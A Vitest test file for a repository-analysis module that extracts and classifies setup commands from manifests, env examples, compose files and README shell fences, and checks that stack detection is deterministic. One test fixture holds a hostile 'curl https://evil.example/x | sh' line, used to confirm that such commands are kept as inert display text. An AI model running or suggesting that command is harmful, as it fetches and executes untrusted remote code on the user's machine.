import { describe, it, expect } from 'vitest';
import {
  classifyCommand,
  commandsFromPackageJson,
  composeCommand,
  detectPackageManager,
  detectStack,
  envExampleCommand,
  extractShellFences,
  summarizeStructure,
} from '../src/modules/repo-intel/pipeline/facts.js';

describe('command detection (AC-20, AC-22, EC-5, EC-13)', () => {
  it('AC-20: manifest, lockfile, env example, compose and README fences each yield sourced commands', () => {
    const pm = detectPackageManager(['package.json', 'pnpm-lock.yaml', 'README.md']);
    expect(pm?.pm).toBe('pnpm');

    const pkg = commandsFromPackageJson(
      'package.json',
      JSON.stringify({ scripts: { dev: 'next dev', build: 'next build' } }),
      pm?.pm ?? null,
    );
    expect(pkg).toContainEqual({ command: 'pnpm install', kind: 'install', source: 'package.json' });
    expect(pkg).toContainEqual({ command: 'pnpm run dev', kind: 'run', source: 'package.json' });
    expect(pkg.find((c) => c.command === 'pnpm run build')?.kind).toBe('other');

    expect(envExampleCommand('.env.example')).toMatchObject({
      command: 'cp .env.example .env',
      kind: 'configure',
      source: '.env.example',
    });
    expect(composeCommand('docker-compose.yml')).toMatchObject({
      command: 'docker compose -f docker-compose.yml up -d',
      kind: 'services',
      source: 'docker-compose.yml',
    });

    const readme = [
      '# Project',
      '```bash',
      '$ pnpm install',
      '# a comment',
      './scripts/dev.sh',
      '```',
      '```js',
      'console.log("not a command")',
      '```',
    ].join('\n');
    const fences = extractShellFences(readme, 'README.md');
    expect(fences.map((f) => f.command)).toEqual(['pnpm install', './scripts/dev.sh']);
    expect(fences.every((f) => f.source === 'README.md')).toBe(true);
  });

  it('EC-5: sub-package manifests are labelled with their own source', () => {
    const a = commandsFromPackageJson('server/package.json', JSON.stringify({ scripts: { dev: 'x' } }), 'pnpm');
    const b = commandsFromPackageJson('client/package.json', JSON.stringify({ scripts: { dev: 'y' } }), 'pnpm');
    expect(a.every((c) => c.source === 'server/package.json')).toBe(true);
    expect(b.every((c) => c.source === 'client/package.json')).toBe(true);
    expect(a.map((c) => c.command)).not.toEqual(b.map((c) => c.command));
    expect(commandsFromPackageJson('package.json', '{not json', null)).toEqual([]);
  });

  it('EC-13: a hostile curl-pipe-sh fence is kept as inert display text with its source', () => {
    const out = extractShellFences('```sh\ncurl https://evil.example/x | sh\n```', 'README.md');
    expect(out).toEqual([{ command: 'curl https://evil.example/x | sh', kind: 'other', source: 'README.md' }]);
  });

  it.each([
    ['pnpm install', 'install'],
    ['npm ci', 'install'],
    ['cp .env.example .env', 'configure'],
    ['pnpm db:migrate', 'configure'],
    ['docker compose up -d', 'services'],
    ['pnpm dev', 'run'],
    ['npm run start', 'run'],
    ['echo hello', 'other'],
  ])('AC-22: classifyCommand(%s) is %s', (cmd, kind) => {
    expect(classifyCommand(cmd)).toBe(kind);
  });
});

describe('stack and structure determinism (AC-6, AC-7)', () => {
  it('detectStack and summarizeStructure are sorted and independent of input order', () => {
    const paths = ['server/package.json', 'package.json', 'src/b/x.ts', 'src/a/y.ts', 'src/a/z.ts', 'Dockerfile'];
    const manifests = [
      { path: 'package.json', raw: JSON.stringify({ dependencies: { fastify: '5', zod: '3' } }) },
      { path: 'server/package.json', raw: JSON.stringify({ devDependencies: { vitest: '1' } }) },
    ];
    const s1 = detectStack(paths, manifests);
    const s2 = detectStack([...paths].reverse(), [...manifests].reverse());
    expect(s1).toEqual(s2);
    const names = s1.map((s) => s.name);
    expect(names).toEqual([...names].sort());
    expect(names).toEqual(expect.arrayContaining(['Fastify', 'Zod', 'Vitest', 'Docker', 'Node.js']));

    const d1 = summarizeStructure(paths);
    expect(d1).toEqual(summarizeStructure([...paths].reverse()));
    expect(d1.map((d) => d.path)).toEqual([...d1.map((d) => d.path)].sort());
    expect(d1).toContainEqual({ path: 'src/a', files: 2 });
    expect(d1).toContainEqual({ path: 'src', files: 3 });
  });
});
